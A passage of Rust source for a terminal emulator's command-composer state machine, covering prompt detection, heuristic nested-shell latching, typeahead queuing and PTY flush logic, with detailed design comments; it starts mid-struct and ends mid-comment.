    /// composer creation (static per terminal: derives from program+args).
    pub relaunch_cmd: Option<String>,
    /// The terminal card owned the keyboard LAST tick (win focused, no
    /// overlay/modal/rename, composer editor not armed) — the same
    /// `grid_focused` signal tick's auto-arm uses, stashed so `show` can
    /// gate the Dead lane's Enter-to-relaunch on real key ownership (a
    /// popup's Enter must never relaunch a terminal).
    pub term_focused: bool,
    /// Prompt latch + settle timestamp (None = not at a prompt).
    at_prompt_since: Option<Instant>,
    /// Bytes were sent to the PTY during this prompt episode (D7).
    episode_used: bool,
    /// Last-seen BlockFeed counters, for edge detection.
    last_pre: u64,
    last_exec: u64,
    /// `pre_seen` at the last activation clear chord (v0.1.1): at most ONE
    /// `^C` may ship per prompt epoch — a systematically-wrong prompt-end
    /// capture used to loop click → chord → fresh prompt → wrong capture →
    /// click… into visible `^C` spam. A repeat activation in the same epoch
    /// arms without the chord (and without re-reclaiming) and yields
    /// honestly through the DEMOTE path if the capture stays broken.
    chord_pre: Option<u64>,
    /// History recall: (walk source, draft saved before recall began).
    recall: Option<(RecallSrc, String)>,
    /// Ctrl-R history search overlay, when open (Tier-2b #1).
    search: Option<HistSearch>,
    /// One-frame flag: place the editor caret at the draft's end before the
    /// TextEdit shows (set by reclaim/insert — the user continues typing at
    /// the end of what just landed).
    caret_to_end: bool,
    /// One-frame flag: the editor should request egui focus this frame.
    pub want_focus: bool,
    /// Actual egui focus of the editor LAST frame (one-frame lag is fine:
    /// egui focus itself is authoritative; this only steers the grid's
    /// `request_focus` and the Enter/arrow consumption).
    pub has_focus: bool,
    /// Active submit handoff, if any (Bug 3).
    submit_hold: Option<SubmitHold>,
    /// Live post-submit typeahead window (None = not in the submit→re-arm
    /// gap). While Some, keys stay in the editor and Enter queues.
    post_submit: Option<SubmitWindow>,
    /// Blind-typed queue: submissions awaiting their prompt cycle. An empty
    /// string is a queued empty-Enter spacer (order against real commands is
    /// preserved — the flush rule requires byte order across queued Enters).
    pending: VecDeque<String>,
    /// Outbox: a grid-verified single-line command whose SubmitHold just
    /// released and should become a PERMANENT history cover in the backend
    /// (`❯ cmd` styling instead of ever showing the raw `PS …>` — the
    /// submit-flicker fix). Drained by the app into the backend (which owns
    /// the covers) right after `tick`. (line, col, cwd, cmd).
    pending_history_cover: Option<(i32, usize, Option<String>, String)>,
    /// Outbox: composer-authored bytes to send to the PTY right after `tick`
    /// (the sanctioned send path, drained by the app). Carries the typeahead
    /// buffer FLUSH (alt-screen/mouse flip, demotion mid-buffer — the busy
    /// threshold no longer flushes: permanent editor) — byte order is
    /// preserved against any Enter still queued.
    pending_clear: Option<Vec<u8>>,
    /// Outbox (P6b §5.2): a Cmd-family submission the app must ship as
    /// `C2D::SubmitCommand{write:true}` instead of Input bytes — the daemon
    /// computes the submission bytes from its mirror AND opens the synthetic
    /// block at the pre-write journal head. Set by `dispatch_submission`
    /// (hand-typed Enter, Run ▸, history Run, and the blind-queue pump all
    /// route here identically); drained the same frame. SubmitHold/cover
    /// mechanics are unchanged — the echo lands in the grid the same way.
    pending_submit_cmd: Option<String>,
    /// GUI-clock timestamp of the last exec edge (stable-chrome hysteresis):
    /// Busy content reveals only once the open block is ≥ REVEAL old, so
    /// instant commands never flash the busy row. GUI-side deliberately —
    /// rec.started_ms is daemon wall-clock plus Blocks latency.
    busy_since: Option<Instant>,
    /// Last submit / exec / pre / hold-release edge: while younger than
    /// REVEAL the Raw left lane renders FROZEN QUIET instead of switching
    /// content — the per-submit label/busy flicker killer (F3).
    last_activity: Option<Instant>,
    /// Compose certainty-loss clock (restored-render fix): the first frame
    /// an ACTIVE Compose could no longer justify the current-prompt cover
    /// (prompt latch or cursor-at-prompt-end broke and no SubmitHold is
    /// bridging). Sustained past `DEMOTE`, the composer steps down to Raw —
    /// the field failure was an armed hint lane UNDER a raw prompt row with
    /// its own cursor (two competing input surfaces) sitting like that
    /// forever on an idle restored session. None while healthy.
    compose_broken_since: Option<Instant>,
    /// Bug C/C2: rising-edge timestamp of the backend's ALT_SCREEN flag
    /// (stamped/cleared by `tick` on the edges) — the strip-collapse
    /// hysteresis clock read by `strip_hidden`, which is now the SINGLE
    /// SOURCE for both the strip paint and the grid geometry (`layout_for`):
    /// paint and PTY size can never disagree because they ask the same
    /// question. The 400ms wait doubles as the resize debounce (HIDE_AFTER).
    alt_since: Option<Instant>,
    /// D2: the live heuristic prompt latch, if any (see `HeurPrompt`).
    /// Minted by `tick` (quiet 300ms + prompt-shape classifier + cursor
    /// anchor), scoped strictly to marker-silent nested-shell episodes.
    heur: Option<HeurPrompt>,
    /// D2: a heuristic episode is live — the first latch minted against an
    /// open `nested_shell_cmd` rec and no tokened marker has arrived since.
    /// Keeps detection allowed once our own synthetic submissions replace
    /// the open nested rec with inner-command recs (an ordinary busy command
    /// must NEVER run the detector — this flag is the false-positive scope).
    /// Cleared on any tokened marker edge, reset, exit, or all recs closing.
    heur_episode: bool,
    /// Optimistic heuristic COVER (flicker fix, decoupled from the 300ms arm)
    /// — OPTIMISTIC-WITH-REVOCATION. The `feed_gen` at which the classifier
    /// STARTED reading the cursor row as a prompt this pass-run (Some ⇒ the
    /// row is being covered). The cover paints the SAME frame the classifier
    /// first passes (no confirm delay — the user could see the one-frame
    /// confirm), then REVOKES the next tick iff feed_gen bumped since (output
    /// arrived ⇒ the row was streaming, not at rest). The ARM (`heur`) is
    /// untouched and still waits the full HEUR_QUIET.
    heur_cover_gen: Option<u64>,
    /// This pass-run was revoked as streaming (feed_gen bumped after we
    /// covered): stay uncovered until the classifier FAILS (ending the run),
    /// so continuous prompt-shaped streaming can't re-flicker the cover on
    /// every other frame.
    heur_cover_revoked: bool,
    /// The row the optimistic cover blanks THIS frame (set by
    /// `maintain_heur_cover` in tick, read by `heur_cover_optimistic`).
    heur_cover_row: Option<i32>,
}

impl Default for ComposerState {
    fn default() -> Self {
        Self {
            mode: ComposerMode::Raw(RawReason::NoPrompt),
            draft: String::new(),
            is_cmd: false,
            fam: complete::Family::Pwsh,
            tab: None,
            asleep: false,
            is_ssh: false,
            reconnecting: false,
            retry_attempt: 0,
            retry_next_s: 0,
            relaunch_cmd: None,
            term_focused: false,
            at_prompt_since: None,
            episode_used: false,
            last_pre: 0,
            last_exec: 0,
            chord_pre: None,
            recall: None,
            search: None,
            caret_to_end: false,
            want_focus: false,
            has_focus: false,
            submit_hold: None,
            post_submit: None,
            pending: VecDeque::new(),
            pending_history_cover: None,
            pending_clear: None,
            pending_submit_cmd: None,
            busy_since: None,
            last_activity: None,
            compose_broken_since: None,
            alt_since: None,
            heur: None,
            heur_episode: false,
            heur_cover_gen: None,
            heur_cover_revoked: false,
            heur_cover_row: None,
        }
    }
}

impl ComposerState {
    /// The prompt latch is live (a scanned `pre` with no `exec` after it).
    pub fn at_prompt_latched(&self) -> bool {
        self.at_prompt_since.is_some()
    }

    /// D2: the heuristic prompt latch is live AND intact — no byte parsed
    /// since the mint (feed_gen), grid un-resized, history un-shrunk, primary
    /// screen, and the cursor still exactly at the latched cell (shifted by
    /// history growth — the hold_row rule: drop, never drift). Feeds the
    /// gate's at_prompt/cursor_clean/settled and every dispatch readiness
    /// check; `tick` clears a latch this returns false for.
    pub(crate) fn heur_live(&self, backend: &TermBackend) -> bool {
        let Some(h) = &self.heur else { return false };
        if backend.feed_gen != h.feed_gen {
            return false; // any output byte after the mint tears it down
        }
        if (backend.size.cols, backend.size.rows) != h.grid {
            return false;
        }
        let mode = backend.mode();
        if mode.contains(TermMode::ALT_SCREEN) || mode.intersects(TermMode::MOUSE_MODE) {
            return false;
        }
        let hist = backend.history_size();
        if hist < h.history {
            return false;
        }
        let line = h.line - (hist - h.history) as i32;
        if line < -(hist as i32) {
            return false;
        }
        backend.cursor_line() == line && backend.cursor_col() == h.col
    }

    /// The grid row the heuristic latch covers this frame, if live — the
    /// armed cover's third source in `cover_line_for` (the detection cell IS
    /// the prompt end: the cursor sits right after `# `).
    fn heur_cover_line(&self, backend: &TermBackend) -> Option<i32> {
        if !self.heur_live(backend) {
            return None;
        }
        let h = self.heur.as_ref()?;
        Some(h.line - (backend.history_size() - h.history) as i32)
    }

    /// The prompt-shape classifier + cursor-anchor + on-screen check, shared
    /// by the arm mint and the optimistic cover (one definition of "the
    /// cursor row reads as a nested-shell prompt right now").
    fn cursor_row_is_prompt(&self, backend: &TermBackend) -> Option<i32> {
        let (prefix, gap) = backend.cursor_prefix_gap();
        if !looks_like_shell_prompt(&prefix, gap) {
            return None;
        }
        let line = backend.cursor_line();
        (line >= 0 && line < backend.size.rows as i32).then_some(line)
    }

    /// Optimistic heuristic COVER row (flicker fix), decoupled from the
    /// HEUR_QUIET arm. The row `maintain_heur_cover` decided to blank THIS
    /// frame (optimistic-with-revocation — covered the frame the classifier
    /// first passed, revoked the next frame if it turned out to be streaming).
    /// Scoped to an established heuristic episode with the strip editor up
    /// (Compose) and the arm latch not yet live (`heur_cover_line` owns the
    /// row once it mints). Presentation only — never gates submission.
    fn heur_cover_optimistic(&self, _backend: &TermBackend) -> Option<i32> {
        self.heur_cover_row
    }

    /// Maintain the optimistic cover (called from `tick`, before the gate
    /// reads inputs). OPTIMISTIC-WITH-REVOCATION: the cover paints the SAME
    /// frame the classifier first reads the cursor row as a prompt (frame N —
    /// no confirm delay, which the user could see as a one-frame dual-prompt
    /// on every re-mint), then REVOKES on the next tick iff `feed_gen` bumped
    /// since (output arrived ⇒ the row was actually streaming, not at rest).
    /// After a revoke the run stays uncovered until the classifier FAILS, so
    /// continuous prompt-shaped streaming cannot re-flicker the cover on
    /// every other frame. Tradeoff (documented): a false cover blanks a
    /// streaming row for at most ONE frame (mild, self-heals, and only when
    /// output is prompt-shaped and rest-check-parked) vs the previous
    /// GUARANTEED one-frame dual-prompt on every genuine re-mint (what the
    /// user reported seeing). The ARM (`heur`) is unaffected — a false cover
    /// can never submit into a running command (the arm keeps the 300ms).
    fn maintain_heur_cover(&mut self, backend: &TermBackend, running: bool) {
        self.heur_cover_row = None;
        // Only in an established nested-shell episode, editor up, primary
        // screen, feed live, and the arm latch not already live.
        let mode = backend.mode();
        let eligible = self.heur_episode
            && self.mode == ComposerMode::Compose
            && running
            && backend.feed_live()
            && !mode.contains(TermMode::ALT_SCREEN)
            && !mode.intersects(TermMode::MOUSE_MODE)
            && !self.heur_live(backend);
        let prompt_row = eligible.then(|| self.cursor_row_is_prompt(backend)).flatten();
        let Some(row) = prompt_row else {
            // Classifier fails / not eligible ⇒ the pass-run ends: clear the
            // covering state AND the streaming-suppress flag so the NEXT
            // fresh prompt (a new fail→pass transition) covers again.
            self.heur_cover_gen = None;
            self.heur_cover_revoked = false;
            return;
        };
        if self.heur_cover_revoked {
            return; // streaming pass-run: stay uncovered until it fails
        }
        match self.heur_cover_gen {
            // Fresh pass-run, first sight ⇒ COVER this very frame (frame N).
            None => {
                self.heur_cover_gen = Some(backend.feed_gen);
                self.heur_cover_row = Some(row);
            }
            // Still at rest (no output batch since we covered) ⇒ keep it.
            Some(g) if g == backend.feed_gen => {
                self.heur_cover_row = Some(row);
            }
            // feed_gen bumped after we covered ⇒ output arrived ⇒ the row was
            // streaming ⇒ REVOKE (uncover this frame) and suppress re-cover.
            Some(_) => {
                self.heur_cover_gen = None;
                self.heur_cover_revoked = true;
            }
        }
    }

    /// D2 episode gate: heuristic detection is ALLOWED to run this frame.
    /// The false-positive killer — the detector never runs at integrated
    /// prompts (live pre latch), never during ordinary busy commands (the
    /// open rec must classify `nested_shell_cmd`, or the episode must
    /// already be live with our own synthetic inner recs open), never
    /// pre-shell, never over TUIs.
    fn heur_gate(&self, backend: &TermBackend, recs: &[BlockRec], running: bool) -> bool {
        if !running || self.asleep || self.reconnecting || self.at_prompt_since.is_some() {
            return false;
        }
        if !backend.feed_live() {
            return false;
        }
        let mode = backend.mode();
        if mode.contains(TermMode::ALT_SCREEN) || mode.intersects(TermMode::MOUSE_MODE) {
            return false;
        }
        // Pre-shell is disjoint by construction (an open rec needs a scanned
        // exec hook ⇒ exec_seen > 0); the explicit check documents intent.
        let (pre_seen, exec_seen) = backend
            .block_feed
            .as_ref()
            .map(|f| (f.pre_seen, f.exec_seen))
            .unwrap_or((0, 0));
        if pre_shell(running, false, pre_seen, exec_seen, false) {
            return false;
        }
        let open = recs.iter().any(|r| r.end_off.is_none());
        open && (self.heur_episode
            || recs
                .iter()
                .any(|r| r.end_off.is_none() && nested_shell_cmd(&r.cmd)))
    }

    /// D2 latch mint (called from `tick`, before the gate reads inputs):
    /// episode gate + output-quiet ≥ HEUR_QUIET + the prompt-shape classifier
    /// on the cursor row + cursor on the primary on-screen grid. Returns the
    /// quiet-window deadline while still pending (the caller schedules a
    /// repaint — an idle terminal produces no frames to mint on). A mint
    /// opens a fresh prompt episode: `episode_used` resets exactly as a
    /// tokened pre would reset it.
    fn maybe_mint_heur(
        &mut self,
        backend: &TermBackend,
        recs: &[BlockRec],
        running: bool,
        now: Instant,
    ) -> Option<Instant> {
        if self.heur.is_some() || !self.heur_gate(backend, recs, running) {
            return None;
        }
        let last = backend.last_output_at()?;
        let deadline = last + HEUR_QUIET;
        if now < deadline {
            return Some(deadline);
        }
        let (prefix, gap) = backend.cursor_prefix_gap();
        if !looks_like_shell_prompt(&prefix, gap) {
            return None;
        }
        let line = backend.cursor_line();
        if line < 0 || line >= backend.size.rows as i32 {
            return None;
        }
        if trace_enabled() {
            log::info!("[composer] heuristic prompt latch minted at ({line}, {})", backend.cursor_col());
        }
        self.heur = Some(HeurPrompt {
            line,
            col: backend.cursor_col(),
            since: now,
            history: backend.history_size(),
            grid: (backend.size.cols, backend.size.rows),
            feed_gen: backend.feed_gen,
        });
        self.heur_episode = true;
        self.episode_used = false;
        None
    }

    /// Counter-diff pump, called from drain_ipc for EVERY terminal on live
    /// Output (selected or not) — keeps unselected composers truthful.
    /// exec is applied before pre: that is their stream order whenever both
    /// land in one chunk (accept → command → next prompt).
    pub fn on_stream_events(&mut self, pre_seen: u64, exec_seen: u64, now: Instant) {
        // NOTE: a live SubmitHold is deliberately NOT released here. Hook
        // counters are stream truth, not grid truth: ConPTY delivers the exec
        // OSC ahead of the asynchronously-rendered echo text (P2 reorder), so
        // releasing on the counter drops the cover onto a still-bare prompt
        // row — the confirmed submit-flicker root cause. Release is grid-
        // observed in `tick` (echo_landed) with the 250ms cap as backstop.
        if exec_seen != self.last_exec {
            self.last_exec = exec_seen;
            // Instant disarm signal, feed-time — beats the Blocks round-trip.
            self.at_prompt_since = None;
            // D2: a tokened marker means integration is alive — the
            // heuristic episode (if any) is over.
            self.heur = None;
            self.heur_episode = false;
            // Stable-chrome edges: the busy hysteresis clock starts here
            // (GUI-side, never rec.started_ms) and the quiet window opens.
            self.busy_since = Some(now);
            self.last_activity = Some(now);
            match self.mode {
                // PERMANENT EDITOR: an exec edge never demotes an existing
                // Compose — the editor is stationary furniture through the
                // whole busy span (submit is gate-disabled, Enter queues,
                // the busy chip narrates). An external SubmitCommand under
                // an armed composer keeps the box too; a grid-typed exec
                // already went Raw via `on_raw_input` before its bytes
                // shipped, so no armed box can shadow raw typing here.
                ComposerMode::Compose => {}
                ComposerMode::Raw(_) => self.mode = ComposerMode::Raw(RawReason::Busy),
            }
        }
        if pre_seen != self.last_pre {
            self.last_pre = pre_seen;
            self.at_prompt_since = Some(now);
            self.episode_used = false;
            // D2 hand-back: the returning tokened pre ends the heuristic
            // episode — the real latch takes over the same event (seamless
            // re-integration, pinned by nested_shell_reattach/heur_handback).
            self.heur = None;
            self.heur_episode = false;
            // The prompt edge closes the busy clock and opens a quiet window
            // so the pre→133;B transient never switches strip content.
            self.busy_since = None;
            self.last_activity = Some(now);
            // Any Raw reason becomes armable; tick's gate decides auto-arm.
            if matches!(self.mode, ComposerMode::Raw(_)) {
                self.mode = ComposerMode::Raw(RawReason::NoPrompt);
            }
        }
    }

    /// Cold-attach (task #15): the daemon certified this session is at an
    /// interactive prompt. Latch it exactly as a live `pre` would so the gate
    /// can auto-arm the instant the app opens — the cover only actually
    /// appears when the seeded `prompt_end` matches the replayed cursor
    /// (clean), so a dirty prompt still lands ManualOnly like live. Never
    /// disturbs an already-active Compose (a reconnect mid-composition).
    pub fn on_attach_prompt(&mut self, now: Instant) {
        if self.mode == ComposerMode::Compose {
            return;
        }
        self.at_prompt_since = Some(now);
        self.episode_used = false;
        self.mode = ComposerMode::Raw(RawReason::NoPrompt);
    }

    /// Restore/reconnect (D2C::Reset): draft kept (D8); latches re-arm from
    /// live hooks only. Queued blind submissions fold into the draft (the
    /// world was rewritten — never fire buffered bytes at it; the user sees
    /// and re-confirms them).
    ///
    /// v0.1.1 (the ssh password-phase plaintext exposure): the hook-counter
    /// baselines MUST resync to the fresh backend's origin. Reset replaces
    /// the TermBackend with a brand-new one whose `pre_seen`/`exec_seen`
    /// start at 0 (gui\mod.rs D2C::Reset) — comparing the old lifetime's
    /// counts against 0 made the very FIRST live output frame of the respawn
    /// (the `Password:` bytes, zero hook OSCs) read as a fresh prompt edge:
    /// `at_prompt` falsely latched off the password prompt itself, the strip
    /// offered `❯ Compose`, and a click gave a visible plaintext editor for
    /// the password.
    pub fn on_reset(&mut self) {
        self.fold_pending_into_draft();
        self.mode = ComposerMode::Raw(RawReason::NoPrompt);
        self.at_prompt_since = None;
        self.episode_used = false;
        self.last_pre = 0;
        self.last_exec = 0;
        self.chord_pre = None;
        self.want_focus = false;
        self.has_focus = false;
        self.submit_hold = None; // the world was rewritten — drop any ghost
        self.pending_history_cover = None;
        self.heur = None;
        self.heur_episode = false;
    }

    /// Session exited. Draft kept; queued submissions fold into it (a dead
    /// PTY can't take them, and silently dropping typed commands lies).
    /// SLEEP §7.3: a flagged-asleep exit is the sleep kill landing — the
    /// reason presents as Asleep, not Dead (the user returns to their
    /// half-typed command after wake; draft-kept is the existing contract).
    pub fn on_exited(&mut self) {
        self.fold_pending_into_draft();
        self.mode = ComposerMode::Raw(if self.asleep {
            RawReason::Asleep
        } else {
            RawReason::Dead
        });
        self.at_prompt_since = None;
        // Counter-baseline resync, symmetric with on_reset (v0.1.1): the
        // next lifetime's backend starts its counters at 0 — stale baselines
        // from this lifetime must never fake a prompt edge on its first
        // output frame.
        self.last_pre = 0;
        self.last_exec = 0;
        self.chord_pre = None;
        self.want_focus = false;
        self.has_focus = false;
        self.submit_hold = None;
        self.heur = None;
        self.heur_episode = false;
    }

    /// The post-submit typeahead buffer is engaged: a submit window is open
    /// or blind submissions are queued. While true, Enter queues and keys
    /// keep landing in the editor — never raw.
    pub(crate) fn buffering(&self) -> bool {
        self.post_submit.is_some() || !self.pending.is_empty()
    }

    /// The queue can take another blind submission.
    fn pending_has_room(&self) -> bool {
        self.pending.len() < PENDING_CAP
    }

    /// Queue one empty-Enter spacing gesture (scope #3). Key-repeats
    /// coalesce here: at most SPACER_QUEUE_CAP consecutive spacers sit at
    /// the queue's tail (`pump_pending` drains at the shell's real prompt-
    /// render pace). The composer NEVER leaves Compose for the gesture — the
    /// field cascade was the first spacer submit yielding to Raw, after
    /// which every remaining key-repeat fell straight through to the grid
    /// as raw Enter spam.
    pub(crate) fn push_spacer(&mut self) {
        let tail_spacers = self
            .pending
            .iter()
            .rev()
            .take_while(|p| p.is_empty())
            .count();
        if tail_spacers < SPACER_QUEUE_CAP && self.pending_has_room() {
            self.pending.push_back(String::new());
        }
    }

    /// Enter during the typeahead window: the draft becomes a queued blind
    /// submission, dispatched on its own prompt cycle by `pump_pending`
    /// (one command per cycle — the fusion-proof rule).
    fn queue_draft(&mut self) {
        let text = std::mem::take(&mut self.draft);
        self.recall = None;
        self.pending.push_back(text.trim_end().to_string());
    }

    /// Fold queued blind submissions back into the visible draft (oldest
    /// first, one line each; spacers drop — they were cosmetic newlines).
    /// Used wherever buffered bytes must NOT fire (deliberate yield, reset,
    /// death, a stale window): nothing typed is ever silently lost, and
    /// nothing executes without the user seeing it.
    fn fold_pending_into_draft(&mut self) {
        self.post_submit = None;
        if self.pending.is_empty() {
            return;
        }
        let mut lines: Vec<String> = self.pending.drain(..).filter(|p| !p.is_empty()).collect();
        if !self.draft.trim().is_empty() {
            lines.push(std::mem::take(&mut self.draft));
        }
        self.draft = lines.join("\n");
        self.caret_to_end = true;
    }

    /// Flush the typeahead buffer to the PTY IN ORDER — queued submissions
    /// each followed by their Enter (`\r`), then the live draft verbatim
    /// (no trailing Enter: the user hasn't pressed it). Plain keystroke
    /// bytes (UTF-8 passthrough, `\r` for Enter — exactly what typing raw
    /// would have produced), queued on the `pending_clear` outbox which the
    /// app ships right after `tick`, i.e. within the SAME frame. Yields the
    /// editor to `reason`.
    fn flush_to_pty(&mut self, reason: RawReason, now: Instant) {
        let mut bytes = Vec::new();
        for item in self.pending.drain(..) {
            bytes.extend_from_slice(keystroke_bytes(&item).as_bytes());
            bytes.push(b'\r');
        }
        let draft = std::mem::take(&mut self.draft);
        bytes.extend_from_slice(keystroke_bytes(&draft).as_bytes());
        if !bytes.is_empty() {
            match &mut self.pending_clear {
                Some(v) => v.extend_from_slice(&bytes),
                None => self.pending_clear = Some(bytes),
            }
        }
        if trace_enabled() {
            log::info!("[composer] typeahead buffer flushed to PTY ({reason:?})");
        }
        self.post_submit = None;
        self.recall = None;
        self.mode = ComposerMode::Raw(reason);
        self.want_focus = false;
        self.has_focus = false;
        self.last_activity = Some(now);
    }

    /// Resolve a live post-submit window (called from `tick`, every frame,
    /// BEFORE the mode belts — rule order is load-bearing):
    /// (s) a stale window (tick paused — deselect/occlusion) folds the
    ///     buffer into the draft: never fire bytes into a moment that has
    ///     passed;
    /// (c) a FRESH `pre` (the common fast-typing case): the shell is back at
    ///     a prompt — close the window, keep the draft, stay Compose; the
    ///     buffered draft is already in place and `pump_pending` dispatches
    ///     the next queued submission at the clean re-latch;
    /// (a) alt-screen or MOUSE_MODE flipped on: the submitted command is a
    ///     full-screen/interactive app and the buffered keys belong to IT —
    ///     flush in order within this same frame and yield raw;
    /// (b) no fresh pre within POST_SUBMIT_FLUSH: long-running command — the
    ///     WINDOW closes but the EDITOR STAYS (permanent-editor fix: the
    ///     measured re-arm gap was exactly this yield — cmd duration minus
    ///     300ms of hidden editor on every slow command, an 80ms blink per
    ///     submit on slow ssh links). Typing keeps accumulating visibly in
    ///     the draft, queued Enters dispatch at the next provably-clean
    ///     prompt via `pump_pending` (never into the running command), and
    ///     the busy chip in the hint slot narrates the run. Exception kept:
    ///     an all-spacer buffer abandons (never blind-fire bare `\r` at a
    ///     shell that stopped prompting — the held-Enter contract).
    fn resolve_post_submit(&mut self, backend: &TermBackend, now: Instant) {
        let Some(w) = self.post_submit else { return };
        let pre_now = backend
            .block_feed
            .as_ref()
            .map(|f| f.pre_seen)
            .unwrap_or(0);
        let age = now.duration_since(w.since);
        let mode = backend.mode();
        let alt = mode.contains(TermMode::ALT_SCREEN);
        let mouse = mode.intersects(TermMode::MOUSE_MODE);
        // D2: a heuristic submission's "shell is back at a prompt" signal is
        // a FRESH heuristic latch (no pre can arrive mid-episode), and its
        // flush threshold stretches to HEUR_FLUSH — the fresh latch takes
        // echo + output + the 300ms quiet, so the integrated 300ms would
        // always lose and dump buffered typing raw.
        let heur_fresh = w.heur
            && self
                .heur
                .as_ref()
                .is_some_and(|h| h.since > w.since);
        let flush_after = if w.heur { HEUR_FLUSH } else { POST_SUBMIT_FLUSH };
        if age >= WINDOW_STALE {
            self.fold_pending_into_draft();
        } else if pre_now > w.pre0 || heur_fresh {
            self.post_submit = None;
        } else if alt || mouse {
            self.flush_to_pty(
                if alt {
                    RawReason::AltScreen
                } else {
                    RawReason::Busy
                },
                now,
            );
        } else if age >= flush_after {
            // PERMANENT EDITOR (rearm-latency fix): the threshold no longer
            // yields the editor and no longer flushes typed text raw — the
            // command is simply long-running. The window closes, Compose
            // (and focus) hold: the draft keeps buffering visibly, queued
            // Enters wait for `pump_pending`'s provably-clean prompt (the
            // never-submit-into-a-running-command invariant, untouched), and
            // the busy-Compose steady state is DEMOTE-healthy (tick). Only
            // the held-Enter contract survives from the old branch: an
            // all-spacer buffer is abandoned, never blind-fired at a shell
            // that stopped prompting.
            if !self.pending.is_empty()
                && self.pending.iter().all(|p| p.is_empty())
                && self.draft.trim().is_empty()
            {
                if trace_enabled() {
                    log::info!(
                        "[composer] spacer queue abandoned: no fresh prompt within {flush_after:?} ({} pending)",
                        self.pending.len()
                    );
                }
                self.pending.clear();
            }
            self.post_submit = None;
        }
    }

    /// Dispatch at most ONE queued blind submission per call, paced by the
    /// shell: only with no window in flight, no live SubmitHold, and the
    /// fresh prompt provably clean (latched + cursor at the captured prompt
    /// end) — exactly the state a hand-typed submit dispatches from. Returns
    /// the bytes to ship and whether this was the spacer gesture (the caller
    /// marks the spacer cover — the existing per-frame plumbing).
    pub(crate) fn pump_pending(
        &mut self,
        backend: &TermBackend,
        cover_line: Option<i32>,
        cwd: Option<&str>,
        now: Instant,
    ) -> Option<(Vec<u8>, bool)> {
        if self.mode != ComposerMode::Compose
            || self.post_submit.is_some()
            || self.submit_hold.is_some()
            || self.pending.is_empty()
        {
            return None;
        }
        // Provably clean fresh prompt: the integrated latch + captured
        // prompt-end pair, or (D2) a live heuristic latch — the exact same
        // state a hand-typed submit dispatches from in each mode.
        //
        // The prompt end must be SETTLED, not provisional (rapid-fire cover
        // fix): during the ConPTY reorder window a 133;B captures prompt_end
        // at col 0 with the cursor also at col 0, so `cursor_at_prompt_end`
        // is briefly true there. Dispatching in that window pins the
        // SubmitHold at col 0; the echo lands at the real prompt-end column,
        // so the hold's `row_has_text_at(row, 0, cmd)` conversion fails and
        // the completed command's row leaks the raw prompt (the field
        // flip-flop). Waiting for the settled cell costs at most
        // PROMPT_END_QUIESCE (40ms, only in the reorder case) — imperceptible
        // for a blind-queued dispatch, and the dispatch still fires the frame
        // the prompt settles. The heuristic latch has no 133;B, so it is
        // never provisional.
        let ready = (self.at_prompt_since.is_some()
            && backend.cursor_at_prompt_end()
            && !backend.prompt_end_pending())
            || self.heur_live(backend);
        if !ready {
            return None;
        }
        let text = self.pending.pop_front()?;
        Some(self.dispatch_submission(backend, cover_line, cwd, &text, now))
    }

    /// Drain the pending history-cover conversion (the app applies it to the
    /// backend, which owns the covers). Called once per frame after `tick`.
    pub fn take_pending_history_cover(
        &mut self,
    ) -> Option<(i32, usize, Option<String>, String)> {
        self.pending_history_cover.take()
    }

    /// The line the SubmitHold ghost should cover this frame, if the handoff
    /// is still valid (not timed out, pin maintainable): the submit-time row
    /// shifted by the history growth since (`hold_row`). Read-only —
    /// release/clearing happens in `tick` (grid-observed `echo_landed` + the
    /// 250ms cap).
    pub fn hold_line(&self, backend: &TermBackend, now: Instant) -> Option<i32> {
        self.submit_hold
            .as_ref()
            .filter(|h| hold_active(h, backend, now))
            .and_then(|h| hold_row(h, backend))
    }

    /// Raw bytes are about to be sent to this terminal's PTY from the grid
    /// (keys, grid paste, wheel-to-arrows, mouse reports — ALL raw bytes
    /// uniformly). Uses the episode when at a prompt; dismisses an armed
    /// composer (D7 — the last input target the user chose is authoritative).
    /// Keys typed into a TUI (`at_prompt` false) do NOT use the episode.
    pub fn on_raw_input(&mut self, now: Instant) {
        if self.at_prompt_since.is_some() {
            self.episode_used = true;
            if trace_enabled() {
                let ms = self
                    .at_prompt_since
                    .map(|t| now.duration_since(t).as_millis())
                    .unwrap_or(0);
                log::info!("[composer] raw key → PTY at a prompt (+{ms}ms since latch)");
            }
        }
        // D2: raw bytes at a heuristic prompt drop the latch IMMEDIATELY —
        // the echo would tear it down a frame later anyway, but that frame
        // is exactly where an AutoArm re-fire would fight the user for
        // focus. Re-arm happens only at the NEXT mint (quiet + clean shape).
        self.heur = None;
        if self.mode == ComposerMode::Compose {
            // The user chose the grid: queued blind submissions fold into
            // the draft (visible, nothing fires behind their back).
            self.fold_pending_into_draft();
            self.mode = ComposerMode::Raw(RawReason::UserRaw);
            self.want_focus = false;
        }
    }

    /// Drain composer-authored PTY bytes queued during `tick` (the typeahead
    /// buffer flush), sent by the app right after it — the sanctioned send
    /// path.
    pub fn take_pending_clear(&mut self) -> Option<Vec<u8>> {
        self.pending_clear.take()
    }

    /// Drain a Cmd-family submission for the app to ship as
    /// `C2D::SubmitCommand{write:true}` (P6b §5.2). Same frame as dispatch.
    pub fn take_submit_cmd(&mut self) -> Option<String> {
        self.pending_submit_cmd.take()
    }

    /// The user yielded an armed composer to the grid (grid click, Esc, the
    /// ⌨ toggle): Raw(UserRaw) for the rest of this prompt episode — without
    /// consuming the episode the gate would auto-re-arm on the very next
    /// frame and fight the user for focus (D7).
    pub fn blur_to_grid(&mut self) {
        // A yield closes the search overlay first (quietly — the user is
        // leaving the editor, so no focus pull): the stashed draft is what
        // folds/persists, never the transient query string.
        self.search_close_quiet();
        if self.mode == ComposerMode::Compose {
            // Deliberate yield mid-buffer: nothing fires — queued blind
            // submissions fold into the draft where the user can see them.
            self.fold_pending_into_draft();
            self.mode = ComposerMode::Raw(RawReason::UserRaw);
            // D2: a live heuristic latch counts as the prompt episode too —
            // without consuming it the gate would auto-re-arm next frame and
            // fight the user for focus (D7). The latch itself is KEPT: the
            // ManualOnly path's ❯ Compose re-arms without any chord.
            if self.at_prompt_since.is_some() || self.heur.is_some() {
                self.episode_used = true;
            }
        }
        self.want_focus = false;
        self.has_focus = false;
    }

    /// Explicit user activation (strip click). Returns bytes to send FIRST:
    /// the clear chord when the prompt provably (or possibly — cold attach)
    /// holds stray text, else empty (D4).
    ///
    /// V2 (P4 §2.4): before clearing a dirty prompt, exactly-recoverable
    /// typed text is PULLED into the draft — the strip label promised
    /// "keeps it" / "clears it" before this click, so the outcome is never a
    /// surprise. Refusal variants (multi-line / mid-line / unavailable) fall
    /// back to v1's discard; the chord ships either way. Keystrokes in
